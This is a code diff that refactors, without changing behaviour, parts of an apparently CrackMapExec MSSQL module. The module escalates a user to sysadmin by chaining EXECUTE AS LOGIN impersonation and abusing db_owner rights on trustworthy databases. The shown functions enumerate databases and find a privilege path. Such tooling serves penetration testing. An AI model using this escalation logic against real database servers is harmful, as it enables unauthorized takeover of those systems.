@@ -93,11 +93,9 @@ class CMEModule:
                     self.do_dbowner_privesc(target_user.dbowner, exec_as)
             if self.is_admin_user(self.current_username):
                 context.log.success(
-                    f"{self.current_username} is now a sysadmin! " +
-                    highlight(
-                        '({})'.format(
-                            context.conf.get('CME', 'pwn3d_label')
-                        )
+                    (
+                        f"{self.current_username} is now a sysadmin! "
+                        + highlight(f"({context.conf.get('CME', 'pwn3d_label')})")
                     )
                 )
 
@@ -150,9 +148,7 @@ class CMEModule:
             return False
 
     def sql_exec_as(self, grantors: list) -> str:
-        exec_as = []
-        for grantor in grantors:
-            exec_as.append(f"EXECUTE AS LOGIN = '{grantor}';")
+        exec_as = [f"EXECUTE AS LOGIN = '{grantor}';" for grantor in grantors]
         return ''.join(exec_as)
 
     def perform_check(self, context, user: User, grantors=[]):
@@ -201,10 +197,11 @@ class CMEModule:
 
     def get_databases(self, exec_as='') -> list:
         res = self.query_and_get_output(
-            exec_as + "SELECT name FROM master..sysdatabases")
+            f"{exec_as}SELECT name FROM master..sysdatabases"
+        )
+
         self.revert_context(exec_as)
-        tables = res.split("\n\n")[2:]
-        return tables
+        return res.split("\n\n")[2:]
 
     def is_dbowner(self, database, exec_as='') -> bool:
         query = f"""select rp.name as database_role
@@ -223,11 +220,11 @@ class CMEModule:
         return res == "db_owner"
 
     def find_dbowner_priv(self, databases, exec_as='') -> list:
-        match = []
-        for database in databases:
-            if self.is_dbowner(database, exec_as):
-                match.append(database)
-        return match
+        return [
+            database
+            for database in databases
+            if self.is_dbowner(database, exec_as)
+        ]
 
     def find_trusted_db(self, exec_as='') -> list:
         query = """SELECT d.name AS DATABASENAME
@@ -252,11 +249,7 @@ class CMEModule:
         databases = self.get_databases(exec_as)
         dbowner = self.find_dbowner_priv(databases, exec_as)
         trusted_db = self.find_trusted_db(exec_as)
-        # return the first match
-        for db in dbowner:
-            if db in trusted_db:
-                return db
-        return None
+        return next((db for db in dbowner if db in trusted_db), None)
 
     def do_dbowner_privesc(self, database, exec_as=''):
         # change context if necessary
